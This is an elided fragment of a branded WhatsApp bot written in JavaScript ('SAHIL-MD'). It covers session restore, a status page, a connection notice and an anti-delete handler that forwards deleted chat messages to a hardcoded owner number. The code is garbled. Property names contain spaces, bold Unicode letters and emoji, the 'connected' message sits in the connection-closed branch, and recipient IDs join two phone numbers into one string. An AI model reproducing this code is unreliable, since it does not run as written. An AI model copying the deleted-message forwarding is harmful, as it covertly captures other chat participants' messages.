...
// Owner numbers
const ownerNumber = ["923128520558"];
...
function loadLocalFiles() {
  ...
  if (fs.existsSync('./lib/sahil-md.html')) {
    console.log("✅ sahil-md.html found in lib folder");
  } else {
    console.log("⚠️ sahil-md.html not found in lib folder");
  }
...
if (!fs.existsSync(CREDS)) {
  ...
  if (!session.includes("𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩~")) {
    console.log("❌ Invalid 𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩 session format");
    process.exit(1);
  }
  ...
  console.log("♻️ 𝐒𝐀𝐇𝐈𝐋 𝐌𝐃 💀🚩 session restored successfully");
}
    ...
    res.send(`
      ...
      <body>
        <div class="container">
          ...
          <p>Owner: ${config.𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩 || '𝐒𝐀𝐇𝐈𝐋'}</p>
        </div>
      </body>
      </html>
    `);
...
async function getProfilePicture(sock, jid) {
  try {
    ...
    return '20260619_183650.jpg'; // Default image
  }
}
...
async function connectToWA() {
  ...
  console.log(`🤖 SAHIL-MD Connecting with prefix: "${prefix}"`);
  ...
  sock.ev.on('connection.update', (update) => {
    ...
    if (connection === 'close') {
      ...
      console.log("✅ 𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩 Bot connected to WhatsApp!");
      ...
      const aliveMsg = `*╭──────────────●●►*\n> *KIRA-MD CONNECTED SUCCESSFULLY*\n\n> *Type ${prefix}menu to view commands*  \n\n*╭⊱✫ 𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩 ✫⊱╮*\n*│✫📂 Bot Name: ${botConfig.𝐒𝐀𝐇𝐈𝐋-𝐌𝐃 💀🚩}*\n*│✫🛡️ Owner: ${config.𝐒𝐀𝐇𝐈𝐋}*\n*│✫♻️ Prefix: ${prefix}*\n*│✫🌍 Mode: ${config.MODE}*\n*│✫⏰ Uptime: ${runtime(process.uptime())}*\n*╰──────────────●●►*\n\n> Enjoy Using 𝐒𝐀𝐇𝐈𝐋 𝐌𝐃 💀🚩`;
      
      // Image URL for connection message
      const imageUrl = '20260619_183650.jpg';
      
      try {
        // Send to owner with image
        sock.sendMessage(ownerNumber[0] + '923294748613@s.whatsapp.net', {
          image: { url: imageUrl },
          caption: aliveMsg
        }).catch(() => {
        ...
        try {
          if (msg.message?.protocolMessage && msg.message.protocolMessage.type === 0) {
            ...
            if (deletedMsg) {
              ...
              const sendTo = ownerNumber[0] + '923294748613@s.whatsapp.net';
